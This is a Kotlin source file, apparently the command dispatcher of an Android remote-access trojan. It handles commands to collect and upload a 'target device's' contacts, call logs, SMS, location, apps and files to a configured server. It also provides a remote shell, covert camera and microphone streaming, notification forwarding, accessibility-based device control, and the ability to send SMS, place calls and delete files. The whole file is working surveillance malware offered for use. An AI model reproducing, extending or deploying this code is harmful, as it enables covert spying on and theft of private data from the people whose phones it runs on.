package com.kashem.shaikh.services

import android.content.Context
import android.content.Intent
import com.kashem.shaikh.MainActivity
import com.kashem.shaikh.actions.AddContact
import com.kashem.shaikh.actions.AppControl
import com.kashem.shaikh.actions.DeviceAlert
import com.kashem.shaikh.actions.MakeCall
import com.kashem.shaikh.actions.SendSms
import com.kashem.shaikh.actions.ShellRunner
import com.kashem.shaikh.collectors.Calls
import com.kashem.shaikh.collectors.Contacts
import com.kashem.shaikh.collectors.DeviceInfo
import com.kashem.shaikh.collectors.FileManager
import com.kashem.shaikh.collectors.InstalledApps
import com.kashem.shaikh.collectors.Location
import com.kashem.shaikh.collectors.Messages
import com.kashem.shaikh.streaming.AudioStreamer
import com.kashem.shaikh.streaming.CameraStreamer
import com.kashem.shaikh.streaming.DeviceControlService
import com.kashem.shaikh.streaming.DeviceController
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object CommandProcessor {

    @Volatile private var cameraStreamer: CameraStreamer? = null

    fun processCommand(
        cmd: String,
        params: Map<String, String>,
        context: Context
    ): String {
        AppLogs.info("Processing command: $cmd, params=$params")
        val host = ConfigManager.getConfig(context)?.host

        return when (cmd) {

            // ═══════════ COLLECTORS ═══════════
            "device_info" -> upload(context, DeviceInfo.collectInfo(context), host)
            "contacts"    -> upload(context, Contacts.collectContacts(context), host)
            "calls"       -> upload(context, Calls.collectCalls(context), host)
            "location"    -> upload(context, Location.collectLocation(context), host)
            "messages"    -> upload(context, Messages.collectMessages(context), host)
            "apps"        -> upload(context, InstalledApps.collectApps(context), host)

            // ═══════════ FILE MANAGER ═══════════
            "files_list" -> FileManager.listFiles(context, params["path"])
            "files_list_json" -> FileManager.listFilesJson(context, params["path"])

            "file_get" -> {
                val p = params["path"] ?: return "ERROR: 'path' required"
                val f = FileManager.openFile(context, p)
                    ?: return "ERROR: Not found or not a file: $p"
                upload(context, f, host)
            }
            "file_delete" -> FileManager.deleteFile(
                params["path"] ?: return "ERROR: 'path' required"
            )
            "file_mkdir" -> FileManager.createDir(
                params["path"] ?: return "ERROR: 'path' required"
            )

            // ═══════════ ACTIONS ═══════════
            "add_contact" -> {
                val name = params["name"] ?: return "ERROR: 'name' missing"
                val number = params["number"] ?: return "ERROR: 'number' missing"
                AddContact.addContact(context, name, number)
            }
            "send_sms" -> {
                val n = params["number"] ?: return "ERROR: 'number' missing"
                val t = params["text"] ?: return "ERROR: 'text' missing"
                SendSms.send(context, n, t)
            }
            "call" -> MakeCall.call(
                context, params["number"] ?: return "ERROR: 'number' missing"
            )
            "dial" -> MakeCall.dial(
                context, params["number"] ?: return "ERROR: 'number' missing"
            )

            "app_launch"    -> AppControl.launch(
                context, params["package"] ?: return "ERROR: 'package' missing"
            )
            "app_uninstall" -> AppControl.uninstall(
                context, params["package"] ?: return "ERROR: 'package' missing"
            )
            "app_info"      -> AppControl.openAppInfo(
                context, params["package"] ?: return "ERROR: 'package' missing"
            )

            // ═══════════ ALERT ═══════════
            "ring"        -> DeviceAlert.ring(context, params["seconds"]?.toIntOrNull() ?: 10)
            "ring_stop"   -> DeviceAlert.stopRing()
            "vibrate"     -> DeviceAlert.vibrate(context, params["ms"]?.toLongOrNull() ?: 2000L)
            "vibrate_pattern" -> DeviceAlert.vibratePattern(context)
            "volume_max"  -> DeviceAlert.maxVolume(context)
            "silent_on"   -> DeviceAlert.silentMode(context)
            "silent_off"  -> DeviceAlert.normalMode(context)

            // ═══════════ SHELL ═══════════
            "shell" -> ShellRunner.run(
                params["cmd"] ?: return "ERROR: 'cmd' missing"
            )

            // ═══════════ CAMERA (photo/video) ═══════════
            "camera_photo_front" -> ForegroundService.getCameraManager()?.startPhoto(true)
                ?: "ERROR: CameraManager not ready"
            "camera_photo_back"  -> ForegroundService.getCameraManager()?.startPhoto(false)
                ?: "ERROR: CameraManager not ready"
            "camera_video_front" -> ForegroundService.getCameraManager()?.startVideo(true)
                ?: "ERROR: CameraManager not ready"
            "camera_video_back"  -> ForegroundService.getCameraManager()?.startVideo(false)
                ?: "ERROR: CameraManager not ready"

            // ═══════════ LIVE CAMERA STREAM ═══════════
            "camera_stream_start" -> startCameraStream(context, params)
            "camera_stream_stop"  -> stopCameraStream()

            // ═══════════ LIVE AUDIO ═══════════
            "audio_start" -> AudioStreamer.start(context)
            "audio_stop"  -> AudioStreamer.stop()

            // ═══════════ NOTIFICATIONS ═══════════
            "notifications_start" -> {
                if (!NotificationListener.isPermissionGranted(context)) {
                    "ERROR: Enable notification access in Settings → Notifications → Device & app notifications"
                } else {
                    NotificationListener.startForwarding()
                }
            }
            "notifications_stop" -> NotificationListener.stopForwarding()

            // ═══════════ DEVICE CONTROLLER ═══════════
            "controller_start" -> {
                if (DeviceController.isRunning()) {
                    "SUCCESS: Already running"
                } else if (!DeviceControlService.isEnabled()) {
                    "ERROR: Accessibility Service not enabled. Enable in Settings → Accessibility"
                } else {
                    try {
                        val intent = Intent(context, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                                    Intent.FLAG_ACTIVITY_CLEAR_TOP
                            putExtra("request_device_controller", true)
                        }
                        context.startActivity(intent)
                        AppLogs.info("DeviceController: permission requested")
                        "SUCCESS: Permission popup sent – confirm on target device"
                    } catch (e: Exception) {
                        AppLogs.error("controller_start failed", e)
                        "ERROR: ${e.message}"
                    }
                }
            }
            "controller_stop" -> DeviceController.stop()

            // ═══════════ STOP ALL ═══════════
            "stop_all" -> handleStopAll(context)

            else -> "UNKNOWN_COMMAND: $cmd"
        }
    }

    // ─────────────────────────────────────────
    private fun startCameraStream(context: Context, params: Map<String, String>): String {
        val front = params["front"]?.toBooleanStrictOrNull() ?: true
        val fgs = ForegroundService.getInstance()
            ?: return "ERROR: ForegroundService not running"

        try { cameraStreamer?.stop() } catch (_: Exception) {}

        return try {
            cameraStreamer = CameraStreamer(context, fgs)
            cameraStreamer?.start(front) ?: "ERROR: Streamer creation failed"
        } catch (e: Exception) {
            AppLogs.error("camera_stream_start failed", e)
            "ERROR: ${e.message}"
        }
    }

    private fun stopCameraStream(): String {
        return try {
            val r = cameraStreamer?.stop() ?: "SUCCESS: Not streaming"
            cameraStreamer = null
            r
        } catch (e: Exception) {
            "ERROR: ${e.message}"
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  ✅ FIXED: upload সফল হলেই cache cleanup
    // ═══════════════════════════════════════════════════════════
    private fun handleStopAll(context: Context): String {
        val host = ConfigManager.getConfig(context)?.host
            ?: return "ERROR: No Server.json config"

        val results = mutableListOf<String>()

        try {
            if (DeviceController.isRunning()) {
                DeviceController.stop()
                results.add("Controller: stopped")
            }
        } catch (e: Exception) {
            AppLogs.error("Controller stop failed", e)
        }

        try {
            if (AudioStreamer.isRunning()) {
                AudioStreamer.stop()
                results.add("Audio: stopped")
            }
        } catch (_: Exception) {}

        try {
            if (cameraStreamer != null) {
                cameraStreamer?.stop()
                cameraStreamer = null
                results.add("CamStream: stopped")
            }
        } catch (_: Exception) {}

        val cam = ForegroundService.getCameraManager()
        if (cam != null) {
            try { cam.stopAll() } catch (_: Exception) {}

            // ✅ Photo: upload সফল হলেই cache cleanup
            try {
                cam.zipPhotos()?.let { zip ->
                    val result = uploadAndResult(context, zip, host)
                    results.add("Photo: $result")
                    if (result.startsWith("SUCCESS")) {
                        try { cam.cleanupPhotos() } catch (_: Exception) {}
                    }
                }
            } catch (e: Exception) {
                AppLogs.error("Photo zip/upload failed", e)
                results.add("Photo: ERROR: ${e.message}")
            }

            // ✅ Video: upload সফল হলেই cache cleanup
            try {
                cam.zipVideos()?.let { zip ->
                    val result = uploadAndResult(context, zip, host)
                    results.add("Video: $result")
                    if (result.startsWith("SUCCESS")) {
                        try { cam.cleanupVideos() } catch (_: Exception) {}
                    }
                }
            } catch (e: Exception) {
                AppLogs.error("Video zip/upload failed", e)
                results.add("Video: ERROR: ${e.message}")
            }
        }

        return if (results.isEmpty()) "SUCCESS: Stop All completed (nothing active)"
        else "SUCCESS: Stop All | " + results.joinToString(" | ")
    }

    private fun upload(context: Context, file: File?, host: String?): String {
        if (host == null) return "ERROR: No Server.json config"
        if (file == null) return "ERROR: No data collected or permission denied"
        return uploadAndResult(context, file, host)
    }

    private fun uploadAndResult(context: Context, file: File, host: String): String {
        var result = "ERROR: Upload failed"
        val latch = CountDownLatch(1)

        FileUploader.uploadFile(context, file, host) { success, url ->
            result = if (success && url != null) {
                AppLogs.logFileUpload(file.name, file.length(), true, url)
                "SUCCESS: $url"
            } else {
                AppLogs.logFileUpload(file.name, file.length(), false, error = "upload failed")
                "FAILED: Upload error"
            }
            latch.countDown()
        }

        val ok = latch.await(300, TimeUnit.SECONDS)
        if (!ok) {
            AppLogs.error("Upload timed out for ${file.name}")
            result = "FAILED: Timeout"
        }

        file.delete()
        return result
    }
}